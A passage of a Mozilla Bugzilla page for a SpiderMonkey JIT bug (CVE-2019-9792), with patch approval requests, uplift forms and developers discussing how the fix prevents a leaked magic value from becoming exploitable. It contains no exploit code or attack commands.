<p>Relanded: <a href="https://hg.mozilla.org/releases/mozilla-esr60/rev/0da96d1212e3281e518b7540d3122871a29e07bf" rel="nofollow">https://hg.mozilla.org/releases/mozilla-esr60/rev/0da96d1212e3281e518b7540d3122871a29e07bf</a></p>
</div></div><div class="change-set" id="a687869_600971"><div class="change" id="aa687869_600971">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_600971" id="a687869_600971"><img src="https://secure.gravatar.com/avatar/a088418052679d9583556d277e6774ee?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_600971" id="a687869_600971"><a class="email " href="/user_profile?user_id=600971" > <span class="fna">Phabricator Automation</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a687869_600971"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a687869_600971">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#a687869_600971">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-13 04:12 PDT" data-time="1552475570">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9049131&amp;action=edit"
           title="Bug 1532599 - Force expected crashes on unexpected magic values."
           class=""
        >Attachment #9049131</a> -
        Attachment description: (esr60) Bug 1532599 - Force expected crashes on unexpected magic values. &rarr; Bug 1532599 - Force expected crashes on unexpected magic values.</div></div></div><div class="change-set" id="c23"><div class="comment" data-id="13984381" data-no="23"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-23" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a687869_600971"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_422187" id="a687869_600971"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-23"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-23" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c23">Comment 23</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-13 09:12 PDT" data-time="1552493530">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-23">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9050674"
         class="attachment"
         data-id="9050674" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="phabricator-D23331-url.txt">
      <meta itemprop="contentSize" content="47">
      <meta itemprop="encodingFormat" content="text/x-phabricator-request">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9050674" itemprop="contentUrl">
        <span id="att-9050674-description" itemprop="description">Bug 1532599 - Branch Pruning: Flag all Phi loops as used.</span></a>
        — <a href="attachment.cgi?id=9050674&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div></div><div class="change-set" id="c24"><div class="comment" data-id="13984387" data-no="24"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-24" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a687869_600971"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_422187" id="a687869_600971"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-24"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-24" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c24">Comment 24</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-13 09:14 PDT" data-time="1552493661">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-24">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-24" data-comment-id="13984387" data-ismarkdown="true" ><p>(In reply to Nicolas B. Pierron [:nbp] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599#c23" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">comment #23</a>)</p>
<blockquote>
<p>Created <span class=""><a href="/attachment.cgi?id=9050674" name="attach_9050674" title="Bug 1532599 - Branch Pruning: Flag all Phi loops as used.">attachment 9050674</a> <a href="/attachment.cgi?id=9050674&amp;action=edit" title="Bug 1532599 - Branch Pruning: Flag all Phi loops as used.">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">Bug 1532599</a> - Branch Pruning: Flag all Phi loops as used.</p>
</blockquote>
<p>This branch implement the conservative approach, which would prevent any optimized-out on Phi which are within a loop if branch pruning ever remove a block either before a loop or within a loop.</p>
</div></div><div class="change-set" id="a824682_280903"><div class="change" id="aa824682_280903">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a824682_280903"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_280903" id="a824682_280903"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a824682_280903"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a824682_280903">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#a824682_280903">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-14 18:13 PDT" data-time="1552612383">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Whiteboard: [adv-main66+][adv-esr60.6+]</div></div></div><div class="change-set" id="a836050_280903"><div class="change" id="aa836050_280903">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a836050_280903"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_280903" id="a836050_280903"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a836050_280903"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a836050_280903">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#a836050_280903">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-14 21:22 PDT" data-time="1552623751">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Alias: CVE-2019-9792</div></div></div><div class="change-set" id="c25"><div class="comment" data-id="13993481" data-no="25"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-25" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a836050_280903"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_422187" id="a836050_280903"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-25"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-25" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c25">Comment 25</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-18 07:04 PDT" data-time="1552917856">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-25">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-25" data-comment-id="13993481" data-ismarkdown="true" ><p>Comment on <span class=""><a href="/attachment.cgi?id=9050674" name="attach_9050674" title="Bug 1532599 - Branch Pruning: Flag all Phi loops as used.">attachment 9050674</a> <a href="/attachment.cgi?id=9050674&amp;action=edit" title="Bug 1532599 - Branch Pruning: Flag all Phi loops as used.">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">Bug 1532599</a> - Branch Pruning: Flag all Phi loops as used.</p>
<h3>Security Approval Request</h3>
<ul>
<li><strong>How easily could an exploit be constructed based on the patch?</strong>: This patch and the comment highlight the issue, but thanks to the previous back-ported to all branches, this should hopefully not be exploitable. This would only cause a controlled crash with the MOZ_RELEASE_ASSERT inserted in the previous patch.</li>
<li><strong>Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?</strong>: Yes</li>
<li><strong>Which older supported branches are affected by this flaw?</strong>: 61+</li>
<li><strong>If not all supported branches, which bug introduced the flaw?</strong>: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1489142" title="RESOLVED FIXED - FlagAllOperandsAsHavingRemovedUses can take a very long time">Bug 1489142</a></li>
<li><strong>Do you have backports for the affected branches?</strong>: No</li>
<li><strong>If not, how different, hard to create, and risky will they be?</strong>: Easy / Trivial.</li>
<li><strong>How likely is this patch to cause regressions; how much testing does it need?</strong>: This patch does the same early return as done in the previous condition, this is safe as this would mark instruction as having-removed-uses and as such prevent optimizations which are replacing unused instructions by optimized out values.  This modification change the algorithm to be conservative instead of being precise, which is ok.</li>
<li><strong>Do you want to request approval of these patches as well?</strong>: on</li>
</ul>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9050674&amp;action=edit"
           title="Bug 1532599 - Branch Pruning: Flag all Phi loops as used."
           class=""
        >Attachment #9050674</a> -
        Flags: sec-approval?</div></div></div><div class="change-set" id="c26"><div class="comment" data-id="13993486" data-no="26"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-26" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a836050_280903"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_422187" id="a836050_280903"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-26"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-26" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c26">Comment 26</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-18 07:06 PDT" data-time="1552917991">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-26">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-26" data-comment-id="13993486" data-ismarkdown="true" ><p>(In reply to Nicolas B. Pierron [:nbp] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599#c25" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">comment #25</a>)</p>
<blockquote>
<ul>
<li><strong>How likely is this patch to cause regressions; how much testing does it need?</strong>: This patch does the same early return as done in the previous condition, this is safe as this would mark instruction as having-removed-uses and as such prevent optimizations which are replacing unused instructions by optimized out values.  This modification change the algorithm to be conservative instead of being precise, which is ok.</li>
</ul>
</blockquote>
<p>There is a concern about potential performance regression to be watched on nightly when running JS benchmarks. So far I have not noticed anything in particular on Octane nor our misc-js benchmarks.</p>
</div></div><div class="change-set" id="c27"><div class="comment" data-id="14000811" data-no="27"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-27" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a836050_280903"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_280903" id="a836050_280903"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-27"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-27" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c27">Comment 27</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-20 17:01 PDT" data-time="1553126495">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-27">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-27" data-comment-id="14000811" data-ismarkdown="true" ><p>Comment on <span class=""><a href="/attachment.cgi?id=9050674" name="attach_9050674" title="Bug 1532599 - Branch Pruning: Flag all Phi loops as used.">attachment 9050674</a> <a href="/attachment.cgi?id=9050674&amp;action=edit" title="Bug 1532599 - Branch Pruning: Flag all Phi loops as used.">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">Bug 1532599</a> - Branch Pruning: Flag all Phi loops as used.</p>
<p>Sec-approval+ for trunk. Let&#39;s see how it performs on nightly.</p>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9050674&amp;action=edit"
           title="Bug 1532599 - Branch Pruning: Flag all Phi loops as used."
           class=""
        >Attachment #9050674</a> -
        Flags: sec-approval? &rarr; sec-approval+</div></div></div><div class="change-set" id="c28"><div class="comment" data-id="14011666" data-no="28"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-28" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_634439" id="a836050_280903"><img src="https://secure.gravatar.com/avatar/dd173269d2ae1dd60942eeb75caaef98?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_634439" id="a836050_280903"><a class="email " href="/user_profile?user_id=634439" > <span class="fna">Samuel Groß</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-28"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-28" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c28">Comment 28</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-26 02:15 PDT" data-time="1553591757">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-28">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-28" data-comment-id="14011666" data-ismarkdown="true" ><p>It appears to me that you consider the way a JS_MAGIC value was turned into memory corruption to be the real security issue here (because only that part is currently fixed and the advisory is already public) rather than the JIT logic bug that lead to the value being leaked to running JS code. Is that correct? I just wanted to check with you before the bug report in our tracker is derestricted :)</p>
</div></div><div class="change-set" id="c29"><div class="comment" data-id="14011869" data-no="29"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-29" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_258347" id="a836050_280903"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_258347" id="a836050_280903"><a class="email " href="/user_profile?user_id=258347" > <span class="fna">Sebastian Hengst [:aryx] (needinfo on intermittent or backout)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-29"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-29" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c29">Comment 29</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-26 03:57 PDT" data-time="1553597848">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-29">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-29" data-comment-id="14011869" data-ismarkdown="true" ><p>Branch Pruning: Flag all Phi loops as used. r=jandem<br>
<a href="https://hg.mozilla.org/integration/autoland/rev/044a64c70a3b7072f1d9e00097b7a8745f43e709" rel="nofollow">https://hg.mozilla.org/integration/autoland/rev/044a64c70a3b7072f1d9e00097b7a8745f43e709</a><br>
<a href="https://hg.mozilla.org/mozilla-central/rev/044a64c70a3b" rel="nofollow">https://hg.mozilla.org/mozilla-central/rev/044a64c70a3b</a></p>
</div></div><div class="change-set" id="c30"><div class="comment" data-id="14011904" data-no="30"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-30" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a836050_280903"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_422187" id="a836050_280903"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-30"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-30" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c30">Comment 30</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-26 04:19 PDT" data-time="1553599172">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-30">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-30" data-comment-id="14011904" data-ismarkdown="true" ><p>(In reply to Samuel Groß from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599#c28" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">comment #28</a>)</p>
<blockquote>
<p>It appears to me that you consider the way a JS_MAGIC value was turned into memory corruption to be the real security issue here (because only that part is currently fixed and the advisory is already public) rather than the JIT logic bug that lead to the value being leaked to running JS code. Is that correct? I just wanted to check with you before the bug report in our tracker is derestricted :)</p>
</blockquote>
<p>Thanks for asking for clarification.</p>
<p>No, I just wanted to attack this issue from all sides. The other reason is that fixing the logic in the JIT might have been complicated. Therefore, we much prefer a controlled null-pointer crash than an exploitable crash.</p>
<p>The first patch which got backported to our ESR version (<a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599#c19" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">comment 19</a>, <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599#c20" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">comment 20</a> and <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599#c22" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">comment 22</a>) is to prevent leveraging a Magic value into an exploit. This patch alone does not give any good hint into what code might be used to create such exploit.</p>
<p>The second and third patches are iterations to prevent the Magic value from being produced by the JIT. The third patch just landed in mozilla central (<a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599#c29" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">comment 29</a>) and we would backport it to affected branches soon. This should fix the non-exploitable null-pointer crashes from the first patch.</p>
<p>The second patch, which is more complicated, would be moved to a new bug as a performance improvement on top of the third patch.</p>
<p>I will let Al answer whether we can open the bug, before the third path (JIT fix from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599#c29" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">comment 29</a>) reaches all versions.</p>
</div><div class="activity"><div class="change">Flags: needinfo?(abillings)</div></div></div><div class="change-set" id="c31"><div class="comment" data-id="14011963" data-no="31"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-31" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_634439" id="a836050_280903"><img src="https://secure.gravatar.com/avatar/dd173269d2ae1dd60942eeb75caaef98?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_634439" id="a836050_280903"><a class="email " href="/user_profile?user_id=634439" > <span class="fna">Samuel Groß</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-31"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-31" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c31">Comment 31</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-26 05:02 PDT" data-time="1553601729">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-31">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-31" data-comment-id="14011963" data-ismarkdown="true" ><p>That sounds good, thanks for clarifying! I&#39;ll wait for a response from Al.</p>
</div></div><div class="change-set" id="c32"><div class="comment" data-id="14012275" data-no="32"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-32" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a836050_280903"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_422187" id="a836050_280903"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-32"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-32" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c32">Comment 32</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-26 07:11 PDT" data-time="1553609516">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-32">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-32" data-comment-id="14012275" data-ismarkdown="true" ><p>Comment on <span class=""><a href="/attachment.cgi?id=9050674" name="attach_9050674" title="Bug 1532599 - Branch Pruning: Flag all Phi loops as used.">attachment 9050674</a> <a href="/attachment.cgi?id=9050674&amp;action=edit" title="Bug 1532599 - Branch Pruning: Flag all Phi loops as used.">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">Bug 1532599</a> - Branch Pruning: Flag all Phi loops as used.</p>
<h3>Beta/Release Uplift Approval Request</h3>
<ul>
<li><strong>Feature/Bug causing the regression</strong>: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1489142" title="RESOLVED FIXED - FlagAllOperandsAsHavingRemovedUses can take a very long time">Bug 1489142</a></li>
<li><strong>User impact if declined</strong>: Fix null-deref crashes (mitigation introduced by the previously backported patch from the same bug)</li>
<li><strong>Is this code covered by automated tests?</strong>: Yes</li>
<li><strong>Has the fix been verified in Nightly?</strong>: Yes</li>
<li><strong>Needs manual test from QE?</strong>: No</li>
<li><strong>If yes, steps to reproduce</strong>:</li>
<li><strong>List of other uplifts needed</strong>: None</li>
<li><strong>Risk to taking this patch</strong>: Low</li>
<li><strong>Why is the change risky/not risky? (and alternatives if risky)</strong>: This change is not risky in terms of security. It change the algorithm to take a conservative approach which will eagerly flag loops of Phi as having uses even if there is none.</li>
</ul>
<p>However performance-wise this might impact the set of optimization we could do by keeping too many live operation where we used to be able to remove them. (such as on micro-benchmarks) So far arewefastyet.com did not report any regressions since <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599#c29" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">comment 29</a>.</p>
<ul>
<li><strong>String changes made/needed</strong>: N/A</li>
<li><strong>Do you want to request approval of these patches as well?</strong>: on</li>
</ul>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9050674&amp;action=edit"
           title="Bug 1532599 - Branch Pruning: Flag all Phi loops as used."
           class=""
        >Attachment #9050674</a> -
        Flags: approval-mozilla-release?</div><div class="change">
        <a href="/attachment.cgi?id=9050674&amp;action=edit"
           title="Bug 1532599 - Branch Pruning: Flag all Phi loops as used."
           class=""
        >Attachment #9050674</a> -
        Flags: approval-mozilla-beta?</div></div></div><div class="change-set" id="c33"><div class="comment" data-id="14012280" data-no="33"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-33" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a836050_280903"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_422187" id="a836050_280903"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-33"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-33" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c33">Comment 33</a>
          </h3>
          &bull;
